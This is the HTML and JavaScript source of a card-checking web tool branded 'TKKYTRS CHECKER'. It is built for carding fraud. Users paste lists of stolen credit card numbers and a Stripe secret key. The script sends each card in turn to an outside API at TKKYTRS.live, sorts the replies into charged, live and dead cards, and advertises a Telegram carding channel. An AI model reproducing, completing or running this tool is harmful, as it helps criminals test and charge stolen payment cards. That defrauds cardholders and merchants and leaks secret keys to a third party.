
<!DOCTYPE html>
<html class="loading">
  <head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=0, minimal-ui">    
    <title>TKKYTRS CHECKER</title>
    <link href="https://fonts.googleapis.com/css?family=Muli:300,300i,400,400i,600,600i,700,700i%7CComfortaa:300,400,700" rel="stylesheet">
    <link href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet">
    <link rel="stylesheet" type="text/css" href="theme-assets/css/vendors.css">
    <link rel="stylesheet" type="text/css" href="theme-assets/css/app-lite.css">
    <link rel="stylesheet" type="text/css" href="theme-assets/css/core/menu/menu-types/vertical-menu.css">
    <link rel="stylesheet" type="text/css" href="theme-assets/css/core/colors/palette-gradient.css">
    	 <script src="https://cdn.jsdelivr.net/npm/sweetalert2@9"></script>
		 <script>
      function submitForm(event) {
            event.preventDefault();

            const checkoutLink = document.getElementById('checkoutlink').value;

            fetch('grab.php', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/x-www-form-urlencoded',
                    },
                    body: new URLSearchParams({
                        checkoutlink: checkoutLink
                    }),
                })
                .then((response) => response.json())
                .then((data) => {
                    document.querySelector('#cslive').value = data.cslive ?? '';
                    document.querySelector('#pklive').value = data.pklive ?? 'pk_live not found';
                    document.querySelector('#xamount').value = data.amount ?? '';
                    document.querySelector('#xemail').value = data.email ?? '';
                    if (data.email == "Email not found") {
                        document.querySelector('#email').value = 'usaabole@gmail.com';
                    }
                });
        }
    </script>
  </head>
<body class="vertical-layout" style="background-color:#112132;" data-color="bg-gradient-x-purple-blue">   
  <style>
		h5,h4{
			color:white;
		}
		.text-center{
			background-color:#0e1d2c;
			border:1px solid #525252;
			border-radius:5px;
		}
		textarea{
			color:white;
			resize: none;
		}

		.text-center::placeholder{
			color:grey;
		}
		.text-center:focus{
			background-color:#0e1d2c;
		}

		textarea::-webkit-scrollbar {
  			width: 5px;
 			background-color: #112132; 
		}

		textarea::-webkit-scrollbar-thumb {
 			border-radius: 10px;
  			background-color: #2e4964; 
		}
		.lista_reprovadass{
			color:#747474;
		}
		.card-body{
			background-color: #1c3044; 
			border-radius:5px;
		}
		.text-center{
			border:none;
		}
		.badge-success,.btn-success{
			background-color: #ffe74c;
			color:black	;
			border:none;
		}
		.btn-success:hover{
			background-color: #c9b63c;
			border:none;
			color:black;
			shadow:hidden;
		}
		.aprovadas{
			background-color: #35a7ff;
			color:black	;
		}
		.badge-danger{
			background-color: #ff5964;
			color:black	;
		}
		.html body .content .content-wrapper{
			background-color:#112132;
		}

		.btn-bg-gradient {
  			background-image: linear-gradient(to right, #FF8008 0%, #FFC837  51%, #FF8008  100%);
   			 margin: 5px;
			 width:49%;
    		padding: 12px 40px;
    		text-align: center;
    		text-transform: uppercase;
    		transition: 0.5s;
    		background-size: 200% auto;
    		color: white;            
    		box-shadow: 0 0 20px #eee;
    		border-radius: 5px;
    		display: block;
			-webkit-box-shadow: 0 0 0 0 #514a9d;
  		}

  		.btn-bg-gradient:hover {
   			background-position: right center; /* change the direction of the change here */
    		color: #fff;
    		text-decoration: none;
  		}

		  .btn-bg-gradient-x {
			background-image: linear-gradient(to right, #ee0979 0%, #ff6a00  51%, #ee0979  100%);
            margin: 5px;
            padding: 12px 45px;
			
            text-align: center;
            text-transform: uppercase;
            transition: 0.5s;
            background-size: 200% auto;
            color: white;            
            box-shadow: 0 0 20px #eee;
            border-radius: 5px;
            display: block;
			-webkit-box-shadow: 0 0 0 0 #514a9d;
  		}

  		.btn-bg-gradient-x:hover {
			background-position: right center; /* change the direction of the change here */
            color: #fff;
            text-decoration: none;
  		}
.mb-11 {
  display: none;
}
		  .statusbar{
			height:320px;
			padding-top:50px;
		  }
		  .hr-statusbar{
			border:none;
			height:1px;
			background-color:#3c5c7c;
		  }
		  
		  option { 
    /* Whatever color  you want */
    background-color: #112132;
	color: white;
	}
	</style>
	
    <div class="app-content content" style="display:block;">
      <div class="content-wrapper" style="background-color:#112132;">
          
	  <div class="text-center" style="background-color:#112132;">
<h4 class="mb-2"><strong>[TKKYTRS] Checker</strong></h4>
<div class="form-group">
CHARGED: <span class="badge badge-success charge">0</span>
LIVE: <span class="badge badge-success aprovadas"> 0</span>
DEAD: <span class="badge badge-danger reprovadas"> 0</span>
TOTAL: <span class="badge badge-primary carregadas"> 0</span>
LIMIT: <span class="badge badge-secondary"> 3000</span><br>
DATE: <span class="badge badge-dark" id="datetime">KHUD CHECK KARLE</span> •  TIME: <span class="badge badge-dark" id="timenow">12:00:00 AM</span>
</div>
	  </div>
	         
  <div class="content-body">
  	<div class="mt-2"></div>
	<div class="row">
		<div class="col-md-12">
			<div class="card">
				<div class="card-body text-center">
					<textarea rows="6" class="form-control text-center form-checker mb-2" placeholder="PUT YOUR CC LIST HERE :>"></textarea>
          <form onsubmit="submitForm(event)">
                        <div class="input-group mb-1">
         <button class="btn btn-submit btn-bg-black text-white" style="background-color:#112132; width: 100%;"><i class="fa fa-submit"></i>DONT CLICK IT</button>
      </div>
      </form>

					<div class="input-group mb-1">
					<input type="text" style="background-color:#112132;" class="form-control" id="sklive" placeholder="SK KEY" name="sklive">&nbsp;       
						<input type="number" style="background-color:#112132;" class="form-control" id="xamount" placeholder="AMOUNT" name="xamount">&nbsp;
			
			                    </div>
                    
                    <div class="input-group mb-11">
						<input type="text" style="background-color:#112132;" class="form-control" id="xemail" placeholder="EMAIL" name="xemail">
					</div>
					<div class="input-group mb-11">
					<input type="number" style="background-color:#112132;" class="form-control" id="ip" placeholder="IP:PORT" name="ip">&nbsp;
					<input type="text" style="background-color:#112132;" class="form-control" id="hydra" placeholder="USER:PASS" name="hydra">
					</div>
					<button class="btn btn-play btn-glow btn-bg-gradient-x-blue-cyan text-white" style="width: 49%; float: left;"><i class="fa fa-play"></i>START</button>
					<button class="btn btn-stop btn-glow btn-bg-gradient-x-red-pink text-white" style="width: 49%; float: right;" disabled><i class="fa fa-stop"></i>STOP</button>
				</div>
			</div>
		</div>

            		<div class="col-xl-12">
			<div class="card">
				<div class="card-body">
					<div class="float-right">
						<button type="show" class="btn btn-primary btn-sm show-charge"><i class="fa fa-eye-slash"></i></button>
					<button class="btn btn-success btn-sm btn-copy1"><i class="fa fa-copy"></i></button>					
					</div>
					<h4 class="card-title mb-1"><i class="fa fa-check-circle text-success"></i> CHARGED <span class="badge badge-success charge">0</span></h4>					
			<div id='cards_charge'></div>
				</div>				
			</div>
		</div>
		<div class="col-xl-12">
			<div class="card">
				<div class="card-body">
					<div class="float-right">
						<button type="show" class="btn btn-primary btn-sm show-lives"><i class="fa fa-eye-slash"></i></button>
					<button class="btn btn-success btn-sm btn-copy"><i class="fa fa-copy"></i></button>					
					</div>
					<h4 class="card-title mb-1"><i class="fa fa-check text-success"></i> CVV/CCN <span class="badge badge-success aprovadas">0</span></h4>					
			<div id='cards_aprovadas'></div>
				</div>				
			</div>
		</div>
		<div class="col-xl-12">
			<div class="card">
				<div class="card-body">
					<div class="float-right">
						<button type='hidden' class="btn btn-primary btn-sm show-dies"><i class="fa fa-eye"></i></button>
					<button class="btn btn-danger btn-sm btn-trash"><i class="fa fa-trash"></i></button>					
					</div>
					<h4 class="card-title mb-1"><i class="fa fa-times text-danger"></i> DECLINED <span class="badge badge-danger reprovadas">0</span></h4>		
						<div style='display: none;' id='cards_reprovadas'></div>
				</div>				
			</div>
		</div>
		
</section>
        </div>
      </div>
    </div>
 
    <script src="theme-assets/js/core/libraries/jquery.min.js" type="text/javascript"></script>

<style>
    footer {
  text-align: center;
  padding: 3px;
  background-color: #0e1d2c;
  color: #FF0000;
}

</style>
<footer>
  <p>Join :- <a href="https://t.me/TKKYTRSCCS">TKKYTRS CCS</a></p>
</footer>
<script>

$(document).ready(function(){


Swal.fire({ title: "FeedBack!", text: "MADE BY @TKKYTRS!", icon: "warning", confirmButtonText: "OK", buttonsStyling: false, confirmButtonClass: 'btn btn-primary'});
Swal.fire({ title: "Note!", text: "JOIN @TKKYTRSCCS!", icon: "success", confirmButtonText: "OK", buttonsStyling: false, confirmButtonClass: 'btn btn-primary'});


$('.show-charge').click(function(){
var type = $('.show-charge').attr('type');
$('#cards_charge').slideToggle();
if(type == 'show'){
$('.show-charge').html('<i class="fa fa-eye"></i>');
$('.show-charge').attr('type', 'hidden');
}else{
$('.show-charge').html('<i class="fa fa-eye-slash"></i>');
$('.show-charge').attr('type', 'show');
}});

$('.show-lives').click(function(){
var type = $('.show-lives').attr('type');
$('#cards_aprovadas').slideToggle();
if(type == 'show'){
$('.show-lives').html('<i class="fa fa-eye"></i>');
$('.show-lives').attr('type', 'hidden');
}else{
$('.show-lives').html('<i class="fa fa-eye-slash"></i>');
$('.show-lives').attr('type', 'show');
}});

$('.show-dies').click(function(){
var type = $('.show-dies').attr('type');
$('#cards_reprovadas').slideToggle();
if(type == 'show'){
$('.show-dies').html('<i class="fa fa-eye"></i>');
$('.show-dies').attr('type', 'hidden');
}else{
$('.show-dies').html('<i class="fa fa-eye-slash"></i>');
$('.show-dies').attr('type', 'show');
}});

$('.btn-trash').click(function(){
	Swal.fire({title: 'REMOVE CC DEAD SUCCESS', icon: 'success', showConfirmButton: false, toast: true, position: 'top-end', timer: 3000});
$('#cards_reprovadas').text('');
});

$('.btn-copy1').click(function(){
	Swal.fire({title: 'COPY CC CHARGED SUCCESS', icon: 'success', showConfirmButton: false, toast: true, position: 'top-end', timer: 3000});
var cards_charge = document.getElementById('cards_charge').innerText;
var textarea = document.createElement("textarea");
textarea.value = cards_charge;
document.body.appendChild(textarea); 
textarea.select(); 
document.execCommand('copy');           document.body.removeChild(textarea); 
});


$('.btn-copy').click(function(){
	Swal.fire({title: 'COPY CC LIVE SUCCESS', icon: 'success', showConfirmButton: false, toast: true, position: 'top-end', timer: 3000});
var cards_lives = document.getElementById('cards_aprovadas').innerText;
var textarea = document.createElement("textarea");
textarea.value = cards_lives;
document.body.appendChild(textarea); 
textarea.select(); 
document.execCommand('copy');           document.body.removeChild(textarea); 
});


$('.btn-play').click(function(){

var cards = $('.form-checker').val().trim();
var array = cards.split('\n');
var sk = $("#sklive").val();
var charge = 0, lives = 0, dies = 0, testadas = 0, txt = '';

if(!cards){
	Swal.fire({title: 'Wheres your card?? please add a card!!', icon: 'error', showConfirmButton: false, toast: true, position: 'top-end', timer: 3000});
	return false;
}

/*if(!pklive){
	Swal.fire({title: 'Wheres your pklive?? please add a pklive!!', icon: 'error', showConfirmButton: false, toast: true, position: 'top-end', timer: 3000});
	return false;
}

if(!cslive){
	Swal.fire({title: 'Wheres your cslive?? please add a cslive!!', icon: 'error', showConfirmButton: false, toast: true, position: 'top-end', timer: 3000});
	return false;
}
*/
if(!xamount){
	xamount = "100";
}

if(!sk){
	sk = "";
}

Swal.fire({title: 'Please wait for the card to be processed !!', icon: 'success', showConfirmButton: false, toast: true, position: 'top-end', timer: 3000});

var line = array.filter(function(value){
if(value.trim() !== ""){
	txt += value.trim() + '\n';
	return value.trim();
}
});

/*
var line = array.filter(function(value){
return(value.trim() !== "");
});
*/

var total = line.length;


/*
line.forEach(function(value){
txt += value + '\n';
});
*/

$('.form-checker').val(txt.trim());
// ảo ma hả, đừng lấy code chứ !!
if(total > 30000){
  Swal.fire({title: ':) DARE TO CHECK MORE THAN 30000 CC Ah, Pretty SMALL!!', icon: 'warning', showConfirmButton: false, toast: true, position: 'top-end', timer: 3000});
  return false;
}

$('.carregadas').text(total);
$('.btn-play').attr('disabled', true);
$('.btn-stop').attr('disabled', false);

line.every(function(data, index){
setTimeout(
function() {
var callBack = $.ajax({
  url: 'http://TKKYTRS.live/API/check.php?name=TKKYTRS&sk='+sk+'&amt='+xamount+'&lista='+data,
  success: function(retorno){
    if(retorno.indexOf("#CHARGED") >= 0){
      Swal.fire({title: '+1 CHARGED CC', icon: 'success', showConfirmButton: false, toast: true, position: 'top-end', timer: 3000});
      $('#cards_charge').append(retorno);
      removelinha();
      charge = charge +1;
      }
      else if(retorno.indexOf("#LIVE") >= 0){
      Swal.fire({title: '+1 LIVE CC', icon: 'success', showConfirmButton: false, toast: true, position: 'top-end', timer: 3000});
      $('#cards_aprovadas').append(retorno);
      removelinha();
      lives = lives +1;
        }else{
      $('#cards_reprovadas').append(retorno);
      removelinha();
      dies = dies +1;
    }
    testadas = charge + lives + dies;
      $('.charge').text(charge);
    $('.aprovadas').text(lives);
    $('.reprovadas').text(dies);
    $('.testadas').text(testadas);
    
    if(testadas == total){
      Swal.fire({title: 'HAVE BEEN DISPOSED', icon: 'success', showConfirmButton: false, toast: true, position: 'top-end', timer: 3000});
      $('.btn-play').attr('disabled', false);
      $('.btn-stop').attr('disabled', true);
    }
        }
      }); 
	  $('.btn-stop').click(function(){
     Swal.fire({title: 'Succeeding Pause !!', icon: 'warning', showConfirmButton: false, toast: true, position: 'top-end', timer: 3000});
     $('.btn-play').attr('disabled', false);
     $('.btn-stop').attr('disabled', true);      
	  callBack.abort();
		 return false;
      });
    }, 10000 * index);
    return true;
    });
  });
});

//line.forEach(function(data){
//var callBack = $.ajax({
//	url: 'kmart.php?cards=' + data + '&kcookie=' + kcookie + '&referrer=Auth',
//	success: function(retorno){
//		if(retorno.indexOf("#CHARGED") >= 0){
//			Swal.fire({title: '+1 CHARGED CC', icon: 'success', showConfirmButton: false, toast: true, position: 'top-end', timer: 3000});
//			$('#cards_charge').append(retorno);
//			removelinha();
//			charge = charge +1;
//			}
//			else if(retorno.indexOf("#LIVE") >= 0){
//			Swal.fire({title: '+1 LIVE CC', icon: 'success', showConfirmButton: false, toast: true, position: 'top-end', timer: 3000});
//			$('#cards_aprovadas').append(retorno);
//			removelinha();
//			lives = lives +1;
//		    }else{
//			$('#cards_reprovadas').append(retorno);
//			removelinha();
//			dies = dies +1;
//		}
//		testadas = charge + lives + dies;
//	    $('.charge').text(charge);
//		$('.aprovadas').text(lives);
//		$('.reprovadas').text(dies);
//		$('.testadas').text(testadas);
//		
//		if(testadas == total){
//			Swal.fire({title: 'HAVE BEEN DISPOSED', icon: 'success', showConfirmButton: false, toast: true, position: 'top-end', timer: 3000});
//			$('.btn-play').attr('disabled', false);
//			$('.btn-stop').attr('disabled', true);
//		}
//        }
//      });
//      $('.btn-stop').click(function(){
//      Swal.fire({title: 'Succeeding Pause !!', icon: 'warning', showConfirmButton: false, toast: true, position: 'top-end', timer: 3000});
//      $('.btn-play').attr('disabled', false);
//      $('.btn-stop').attr('disabled', true);      
//      	callBack.abort();
//      	return false;
//      });
//    });
//  });
//});

function removelinha() {
var lines = $('.form-checker').val().split('\n');
lines.splice(0, 1);
$('.form-checker').val(lines.join("\n"));
}

var myVar=setInterval(function(){myTimer()},1000);
function myTimer() {
	var dt = new Date();
	document.getElementById("datetime").innerHTML = dt.toLocaleDateString();
    var d = new Date();
    document.getElementById("timenow").innerHTML = d.toLocaleTimeString();
}

  
	
</script>

  </body>
</html>